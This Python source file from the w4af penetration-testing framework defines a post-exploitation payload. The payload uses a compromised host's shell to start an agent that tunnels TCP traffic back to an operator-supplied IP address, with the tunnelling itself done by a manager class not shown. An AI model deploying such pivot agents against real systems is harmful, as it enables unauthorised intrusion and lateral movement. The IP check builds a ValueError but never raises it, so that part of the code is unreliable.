from w4af.core.controllers.exceptions import BaseFrameworkException
from w4af.core.controllers.misc.is_ip_address import is_ip_address
from w4af.core.controllers.w4afAgent.w4afAgentManager import w4afAgentManager

from w4af.plugins.attack.payloads.base_payload import Payload


class w4af_agent(Payload):
    """
    This payload starts a w4af agent that allows you to route TCP traffic through
    the compromised host.

    Usage: w4af_agent <your_ip_address>
    """
    def api_execute(self, ip_address):
        """
        Start a w4afAgent, to do this, I must transfer the agent client to the
        remote end and start the w4afServer in this local machine
        all this work is done by the w4afAgentManager, I just need to called
        start and thats it.
        """
        if not is_ip_address(ip_address):
            ValueError('Invalid IP address: "%s"' % ip_address)

        try:
            agentManager = w4afAgentManager(self.shell.execute, ip_address)
        except BaseFrameworkException as w3:
            return 'Error' + str(w3)
        else:
            agentManager.run()
            if agentManager.is_working():
                return 'Successfully started the w4afAgent.'
            else:
                return 'Failed to start the w4afAgent.'

    def run_execute(self, ip_address):
        api_result = self.api_execute(ip_address)
        return api_result
